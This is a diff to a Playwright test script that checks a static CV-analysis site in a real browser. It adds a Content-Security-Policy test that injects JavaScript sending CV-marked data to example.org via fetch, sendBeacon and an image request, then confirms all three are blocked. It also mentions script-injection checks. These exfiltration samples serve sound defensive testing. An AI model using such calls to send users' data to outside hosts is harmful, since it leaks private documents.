@@ -13,6 +13,8 @@ download). Serves site/ on a random local port and checks, in a real browser:
   TC-10  CV text never leaves the browser (unique marker in 0 requests, 0 non-GET requests)
   SEC    job text renders as text (<img onerror> creates nothing; javascript: links dropped)
   SRI    all CDN libraries load with their integrity hashes; 0 page errors
+  CSP    the page's Content-Security-Policy is present, nothing it blocks is needed (0 violations),
+         and it really blocks fetch / sendBeacon / <img> to a foreign host
 """
 from __future__ import annotations
 
@@ -51,7 +53,7 @@ def main() -> int:
     url = f"http://127.0.0.1:{srv.server_address[1]}/index.html"
     threading.Thread(target=srv.serve_forever, daemon=True).start()
     tmp = tempfile.mkdtemp(prefix="csa_")
-    results, errors, reqs = [], [], []
+    results, errors, reqs, csp = [], [], [], []
 
     def check(name, ok, detail=""):
         results.append((name, bool(ok), detail))
@@ -69,6 +71,7 @@ def main() -> int:
         def page():
             pg = b.new_context(viewport={"width": 1280, "height": 900}).new_page()
             pg.on("pageerror", lambda e: errors.append(str(e)))
+            pg.on("console", lambda m: csp.append(m.text) if "Content Security Policy" in m.text else None)
             pg.on("request", lambda r: reqs.append((r.method, r.url, r.post_data or "")))
             pg.goto(url)
             pg.wait_for_timeout(2500)
@@ -130,9 +133,26 @@ def main() -> int:
         pg.wait_for_timeout(300)
         check("SEC job text renders as text", inj == [0, False] and pg.evaluate("window.__pwned") == 0, str(inj))
         pg.context.close()
+        # CSP must BLOCK exfiltration to any other host (fetch / beacon / image), not just be present
+        pg = b.new_context().new_page()
+        reached = []
+        pg.on("requestfinished", lambda r: reached.append(r.url) if "example.org" in r.url else None)
+        pg.goto(url)
+        pg.wait_for_timeout(1500)
+        pg.evaluate("""async () => {
+            try { await fetch('https://example.org/x?cv=1'); } catch (e) {}
+            try { navigator.sendBeacon('https://example.org/b', 'cv'); } catch (e) {}
+            await new Promise(r => { const i = new Image(); i.onload = i.onerror = () => r(); i.src = 'https://example.org/i.gif?cv=1'; }); }""")
+        pg.wait_for_timeout(800)
+        check("CSP blocks fetch/beacon/img to a foreign host", not reached, ", ".join(reached))
+        pg.context.close()
         b.close()
     srv.shutdown()
     check("0 page errors", not errors, "; ".join(errors[:3]))
+    check("CSP: 0 violations", not csp, "; ".join(c[:140] for c in csp[:3]))
+    html = open(os.path.join(ROOT, "site", "index.html"), encoding="utf-8").read()
+    check("CSP: connect-src limited to self + GoatCounter",
+          "connect-src 'self' https://attsis.goatcounter.com;" in html)
     for name, ok, detail in results:
         print(("PASS " if ok else "FAIL ") + name + (f"  ({detail})" if detail else ""))
     bad = [r for r in results if not r[1]]
